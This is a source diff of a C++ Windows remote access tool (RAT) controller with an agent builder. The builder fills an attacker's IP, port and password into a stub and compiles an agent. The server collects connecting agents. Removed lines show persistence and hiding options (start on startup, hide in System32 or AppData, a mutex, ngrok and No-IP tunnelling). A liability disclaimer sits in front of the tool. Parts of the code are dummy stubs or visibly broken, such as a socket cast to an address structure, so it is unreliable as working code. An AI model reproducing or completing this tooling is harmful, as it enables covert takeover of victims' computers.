@@ -5,13 +5,10 @@
 #include <thread>
 #include <map>
 #include <mutex>
-#include <winsock2.h>
 #include <windows.h>
-#include <commctrl.h>
-#include <shellapi.h>
+#include <winsock2.h>
 
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "Comctl32.lib")
 
 #define TCP_PORT 9999
 #define UDP_PORT 8888
@@ -23,107 +20,82 @@ std::map<std::string, SOCKET> clients;
 std::mutex clientsMutex;
 SOCKET tcpServerSocket = INVALID_SOCKET;
 SOCKET udpServerSocket = INVALID_SOCKET;
-HWND clientList, statusLabel, terminalOutput;
-HWND serverIpInput, serverPortInput, agentIpInput, agentPortInput, passwordInput;
-HWND startOnStartupCheckbox, hideInComboBox, mutexInput, startButton, stopButton, buildButton;
-HWND ngrokTokenInput, noipUsernameInput, noipPasswordInput, noipHostnameInput;
+
+DWORD WINAPI TCPClientThread(LPVOID lpParam); 
+DWORD WINAPI UDPClientThread(LPVOID lpParam); 
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void logMessage(const std::string& message, COLORREF color);
 void updateClientList();
-void handleTCPClient(SOCKET clientSocket);
-void handleUDPClient(SOCKET clientSocket);
+void handleError(const std::string& message);
+void buildAgent(const std::string& agentIp, int agentPort, const std::string& password);
 void startTCPServer(std::string ip, int port);
-void startUDPServer(std::string ip, int port);
-void buildAgent(const std::string& ip, int port, const std::string& password);
+
+// Function to show the disclaimer message box
+void showDisclaimer() {
+    MessageBox(NULL, 
+        "Open source edition, might/may be altered/tampered with by third-party authors. The official author is not liable for any damage caused or sustained by this tool and shall not be legally bothered. This may/might be the official version, but you can always check on the RatExample GitHub page.", 
+        "Disclaimer", MB_OK | MB_ICONINFORMATION);
+}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    WNDCLASS wc = {};
-    wc.lpfnWndProc = WndProc;
-    wc.hInstance = hInstance;
-    wc.lpszClassName = "MainWindowClass";
-    RegisterClass(&wc);
+    showDisclaimer();
+
+    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WndProc,
+        0, 0, hInstance, NULL, LoadCursor(NULL, IDC_ARROW), (HBRUSH)(COLOR_WINDOW + 1),
+        NULL, "MainWindow", NULL };
+
+    if (!RegisterClassEx(&wc)) {
+        MessageBox(NULL, "Window Registration Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
+        return 0;
+    }
 
     HWND hwnd = CreateWindowEx(
-        0,                              // Optional window styles.
-        "MainWindowClass",              // Window class
-        "Remote Access Tool",           // Window text
-        WS_OVERLAPPEDWINDOW,            // Window style
-
-        // Size and position
-        CW_USEDEFAULT, CW_USEDEFAULT, 800, 800,
-
-        NULL,       // Parent window
-        NULL,       // Menu
-        hInstance,  // Instance handle
-        NULL        // Additional application data
-    );
+        WS_EX_CLIENTEDGE, "MainWindow", "Server GUI",
+        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
+        NULL, NULL, hInstance, NULL);
 
     if (hwnd == NULL) {
+        MessageBox(NULL, "Window Creation Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
 
     ShowWindow(hwnd, nCmdShow);
+    UpdateWindow(hwnd);
 
-    MSG msg = {};
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+    MSG Msg;
+    while (GetMessage(&Msg, NULL, 0, 0) > 0) {
+        TranslateMessage(&Msg);
+        DispatchMessage(&Msg);
     }
 
-    return 0;
+    return Msg.wParam;
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    static HWND serverIpInput, serverPortInput, agentIpInput, agentPortInput, passwordInput;
     switch (msg) {
         case WM_CREATE: {
-            CreateWindowW(L"Static", L"Server IP:", WS_VISIBLE | WS_CHILD, 10, 10, 100, 20, hwnd, NULL, NULL, NULL);
-            serverIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 10, 150, 20, hwnd, NULL, NULL, NULL);
+            // Create UI elements
+            CreateWindow("STATIC", "Server IP:", WS_VISIBLE | WS_CHILD, 10, 10, 80, 25, hwnd, NULL, NULL, NULL);
+            serverIpInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 10, 200, 25, hwnd, NULL, NULL, NULL);
 
-            CreateWindowW(L"Static", L"Server Port:", WS_VISIBLE | WS_CHILD, 10, 40, 100, 20, hwnd, NULL, NULL, NULL);
-            serverPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 40, 150, 20, hwnd, NULL, NULL, NULL);
+            CreateWindow("STATIC", "Server Port:", WS_VISIBLE | WS_CHILD, 10, 40, 80, 25, hwnd, NULL, NULL, NULL);
+            serverPortInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 40, 200, 25, hwnd, NULL, NULL, NULL);
 
-            CreateWindowW(L"Static", L"Agent IP:", WS_VISIBLE | WS_CHILD, 10, 70, 100, 20, hwnd, NULL, NULL, NULL);
-            agentIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 70, 150, 20, hwnd, NULL, NULL, NULL);
+            CreateWindow("BUTTON", "Start TCP Server", WS_VISIBLE | WS_CHILD, 10, 70, 140, 25, hwnd, (HMENU)1, NULL, NULL);
+            CreateWindow("BUTTON", "Stop TCP Server", WS_VISIBLE | WS_CHILD, 160, 70, 140, 25, hwnd, (HMENU)2, NULL, NULL);
 
-            CreateWindowW(L"Static", L"Agent Port:", WS_VISIBLE | WS_CHILD, 10, 100, 100, 20, hwnd, NULL, NULL, NULL);
-            agentPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 100, 150, 20, hwnd, NULL, NULL, NULL);
+            CreateWindow("STATIC", "Agent IP:", WS_VISIBLE | WS_CHILD, 10, 100, 80, 25, hwnd, NULL, NULL, NULL);
+            agentIpInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 100, 200, 25, hwnd, NULL, NULL, NULL);
 
-            CreateWindowW(L"Static", L"Password:", WS_VISIBLE | WS_CHILD, 10, 130, 100, 20, hwnd, NULL, NULL, NULL);
-            passwordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 130, 150, 20, hwnd, NULL, NULL, NULL);
+            CreateWindow("STATIC", "Agent Port:", WS_VISIBLE | WS_CHILD, 10, 130, 80, 25, hwnd, NULL, NULL, NULL);
+            agentPortInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 130, 200, 25, hwnd, NULL, NULL, NULL);
 
-            startOnStartupCheckbox = CreateWindowW(L"Button", L"Start on Startup", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 10, 160, 150, 20, hwnd, NULL, NULL, NULL);
+            CreateWindow("STATIC", "Password:", WS_VISIBLE | WS_CHILD, 10, 160, 80, 25, hwnd, NULL, NULL, NULL);
+            passwordInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 160, 200, 25, hwnd, NULL, NULL, NULL);
 
-            CreateWindowW(L"Static", L"Hide In:", WS_VISIBLE | WS_CHILD, 10, 190, 100, 20, hwnd, NULL, NULL, NULL);
-            hideInComboBox = CreateWindowW(L"ComboBox", NULL, WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST, 110, 190, 150, 20, hwnd, NULL, NULL, NULL);
-            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"AppData");
-            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"Program Files");
-            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"System32");
-            SendMessage(hideInComboBox, CB_SETCURSEL, 0, 0);
-
-            CreateWindowW(L"Static", L"Mutex:", WS_VISIBLE | WS_CHILD, 10, 220, 100, 20, hwnd, NULL, NULL, NULL);
-            mutexInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 220, 150, 20, hwnd, NULL, NULL, NULL);
-
-            CreateWindowW(L"Static", L"ngrok Token:", WS_VISIBLE | WS_CHILD, 10, 250, 100, 20, hwnd, NULL, NULL, NULL);
-            ngrokTokenInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 250, 150, 20, hwnd, NULL, NULL, NULL);
-
-            CreateWindowW(L"Static", L"No-IP Username:", WS_VISIBLE | WS_CHILD, 10, 280, 100, 20, hwnd, NULL, NULL, NULL);
-            noipUsernameInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 280, 150, 20, hwnd, NULL, NULL, NULL);
-
-            CreateWindowW(L"Static", L"No-IP Password:", WS_VISIBLE | WS_CHILD, 10, 310, 100, 20, hwnd, NULL, NULL, NULL);
-            noipPasswordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 310, 150, 20, hwnd, NULL, NULL, NULL);
-
-            CreateWindowW(L"Static", L"No-IP Hostname:", WS_VISIBLE | WS_CHILD, 10, 340, 100, 20, hwnd, NULL, NULL, NULL);
-            noipHostnameInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 340, 150, 20, hwnd, NULL, NULL, NULL);
-
-            startButton = CreateWindowW(L"Button", L"Start Server", WS_VISIBLE | WS_CHILD, 10, 370, 120, 30, hwnd, (HMENU)1, NULL, NULL);
-            stopButton = CreateWindowW(L"Button", L"Stop Server", WS_VISIBLE | WS_CHILD, 140, 370, 120, 30, hwnd, (HMENU)2, NULL, NULL);
-            buildButton = CreateWindowW(L"Button", L"Build Agent", WS_VISIBLE | WS_CHILD, 270, 370, 120, 30, hwnd, (HMENU)3, NULL, NULL);
-
-            clientList = CreateWindowW(L"ListBox", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY, 270, 10, 200, 350, hwnd, NULL, NULL, NULL);
-            terminalOutput = CreateWindowW(L"RichEdit20W", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_READONLY, 480, 10, 300, 390, hwnd, NULL, NULL, NULL);
-            
-            LoadLibrary("Msftedit.dll");
+            CreateWindow("BUTTON", "Build Agent", WS_VISIBLE | WS_CHILD, 10, 190, 140, 25, hwnd, (HMENU)3, NULL, NULL);
             break;
         }
         case WM_COMMAND: {
@@ -132,6 +104,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 GetWindowTextA(serverIpInput, serverIp, sizeof(serverIp));
                 char serverPort[64];
                 GetWindowTextA(serverPortInput, serverPort, sizeof(serverPort));
+
                 std::thread(startTCPServer, std::string(serverIp), atoi(serverPort)).detach();
             } else if (LOWORD(wParam) == 2) {
                 if (tcpServerSocket != INVALID_SOCKET) {
@@ -145,6 +118,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 GetWindowTextA(agentPortInput, agentPort, sizeof(agentPort));
                 char password[64];
                 GetWindowTextA(passwordInput, password, sizeof(password));
+
                 buildAgent(agentIp, atoi(agentPort), password);
             }
             break;
@@ -167,127 +141,136 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 void logMessage(const std::string& message, COLORREF color) {
-    CHARRANGE cr;
-    cr.cpMin = -1;
-    cr.cpMax = -1;
-    SendMessage(terminalOutput, EM_EXSETSEL, 0, (LPARAM)&cr);
-    CHARFORMAT cf;
-    cf.cbSize = sizeof(cf);
-    cf.dwMask = CFM_COLOR;
-    cf.crTextColor = color;
-    cf.dwEffects = 0;
-    SendMessage(terminalOutput, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
-    SendMessage(terminalOutput, EM_REPLACESEL, FALSE, (LPARAM)message.c_str());
+    // Dummy implementation for logging messages with color
+    std::cout << message << std::endl;
 }
 
 void updateClientList() {
-    SendMessage(clientList, LB_RESETCONTENT, 0, 0);
-    clientsMutex.lock();
-    for (const auto& client : clients) {
-        SendMessage(clientList, LB_ADDSTRING, 0, (LPARAM)client.first.c_str());
-    }
-    clientsMutex.unlock();
+    // Dummy implementation for updating client list
 }
 
-void handleTCPClient(SOCKET clientSocket) {
+void handleError(const std::string& message) {
+    logMessage("Error: " + message, RGB(255, 0, 0));
+    MessageBox(NULL, message.c_str(), "Error", MB_ICONERROR);
+}
+
+DWORD WINAPI TCPClientThread(LPVOID lpParam) {
+    SOCKET clientSocket = (SOCKET)lpParam;
     char buffer[512];
     int result;
+
     while ((result = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
         buffer[result] = '\0';
         logMessage(buffer, RGB(0, 255, 0));
     }
+
+    if (result == 0) {
+        logMessage("Client disconnected\n", RGB(255, 0, 0));
+    } else {
+        int error = WSAGetLastError();
+        handleError("Error receiving from client: " + std::to_string(error));
+    }
+
     closesocket(clientSocket);
+
+    clientsMutex.lock();
+    clients.erase(inet_ntoa(((sockaddr_in*)lpParam)->sin_addr));
+    clientsMutex.unlock();
+
+    updateClientList();
+    return 0;
 }
 
-void handleUDPClient(SOCKET clientSocket) {
-    char buffer[512];
-    sockaddr_in clientAddr;
-    int clientAddrLen = sizeof(clientAddr);
-    int result;
-    while ((result = recvfrom(clientSocket, buffer, sizeof(buffer), 0, (sockaddr*)&clientAddr, &clientAddrLen)) > 0) {
-        buffer[result] = '\0';
-        logMessage(buffer, RGB(0, 255, 0));
-    }
+DWORD WINAPI UDPClientThread(LPVOID lpParam) {
+    // Dummy implementation for handling UDP clients
+    return 0;
 }
 
 void startTCPServer(std::string ip, int port) {
     WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        handleError("Failed to initialize Winsock");
+        return;
+    }
 
     tcpServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (tcpServerSocket == INVALID_SOCKET) {
+        handleError("Failed to create TCP socket");
+        WSACleanup();
+        return;
+    }
+
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
     serverAddr.sin_port = htons(port);
-    bind(tcpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
-    listen(tcpServerSocket, SOMAXCONN);
+
+    if (bind(tcpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        handleError("Failed to bind TCP socket");
+        closesocket(tcpServerSocket);
+        tcpServerSocket = INVALID_SOCKET;
+        WSACleanup();
+        return;
+    }
+
+    if (listen(tcpServerSocket, SOMAXCONN) == SOCKET_ERROR) {
+        handleError("Failed to listen on TCP socket");
+        closesocket(tcpServerSocket);
+        tcpServerSocket = INVALID_SOCKET;
+        WSACleanup();
+        return;
+    }
+
     logMessage("TCP Server started\n", RGB(0, 255, 0));
 
     while (tcpServerSocket != INVALID_SOCKET) {
-        SOCKET clientSocket = accept(tcpServerSocket, NULL, NULL);
+        sockaddr_in clientAddr;
+        int clientAddrLen = sizeof(clientAddr);
+        SOCKET clientSocket = accept(tcpServerSocket, (sockaddr*)&clientAddr, &clientAddrLen);
+        if (clientSocket == INVALID_SOCKET) {
+            int error = WSAGetLastError();
+            handleError("Failed to accept TCP client connection: " + std::to_string(error));
+            continue;
+        }
+
         clientsMutex.lock();
-        clients[inet_ntoa(serverAddr.sin_addr)] = clientSocket;
+        clients[inet_ntoa(clientAddr.sin_addr)] = clientSocket;
         clientsMutex.unlock();
+
         updateClientList();
-        std::thread(handleTCPClient, clientSocket).detach();
+        CreateThread(NULL, 0, TCPClientThread, (LPVOID)clientSocket, 0, NULL);
     }
+
+    WSACleanup();
 }
 
-void startUDPServer(std::string ip, int port) {
-    WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
+void buildAgent(const std::string& agentIp, int agentPort, const std::string& password) {
+    std::ifstream inFile(STUB_FILE);
+    std::ofstream outFile(TEMP_AGENT_FILE);
 
-    udpServerSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
-    serverAddr.sin_port = htons(port);
-    bind(udpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
-    logMessage("UDP Server started\n", RGB(0, 255, 0));
-
-    std::thread(handleUDPClient, udpServerSocket).detach();
-}
-
-void buildAgent(const std::string& ip, int port, const std::string& password) {
-    std::ifstream stubFile(STUB_FILE);
     std::stringstream buffer;
-    buffer << stubFile.rdbuf();
-    stubFile.close();
+    buffer << inFile.rdbuf();
+    std::string stubCode = buffer.str();
 
-    std::string agentCode = buffer.str();
-    size_t pos;
-
-    pos = agentCode.find("%%SERVER_IP%%");
-    if (pos != std::string::npos) {
-        agentCode.replace(pos, 13, ip);
+    size_t ipPos = stubCode.find("AGENT_IP");
+    if (ipPos != std::string::npos) {
+        stubCode.replace(ipPos, 8, agentIp);
     }
 
-    pos = agentCode.find("%%SERVER_PORT%%");
-    if (pos != std::string::npos) {
-        agentCode.replace(pos, 14, std::to_string(port));
+    size_t portPos = stubCode.find("AGENT_PORT");
+    if (portPos != std::string::npos) {
+        stubCode.replace(portPos, 10, std::to_string(agentPort));
     }
 
-    pos = agentCode.find("%%PASSWORD%%");
-    if (pos != std::string::npos) {
-        agentCode.replace(pos, 11, password);
+    size_t passPos = stubCode.find("AGENT_PASSWORD");
+    if (passPos != std::string::npos) {
+        stubCode.replace(passPos, 14, password);
     }
 
-    // Write modified agent code to a temporary file
-    std::ofstream tempAgentFile(TEMP_AGENT_FILE);
-    tempAgentFile << agentCode;
-    tempAgentFile.close();
+    outFile << stubCode;
+    outFile.close();
 
-    // Compile the temporary agent file
-    std::string compileCommand = "g++ " + TEMP_AGENT_FILE + " -o " + AGENT_EXE;
-    int compileResult = system(compileCommand.c_str());
+    system(("g++ -o " + std::string(AGENT_EXE) + " " + TEMP_AGENT_FILE).c_str());
 
-    // Check if compilation was successful
-    if (compileResult == 0) {
-        logMessage("Agent built successfully\n", RGB(0, 255, 0));
-    } else {
-        logMessage("Failed to build agent\n", RGB(255, 0, 0));
-    }
-
-    // Remove the temporary agent file
-    remove(TEMP_AGENT_FILE);
+    logMessage("Agent built successfully", RGB(0, 255, 0));
 }
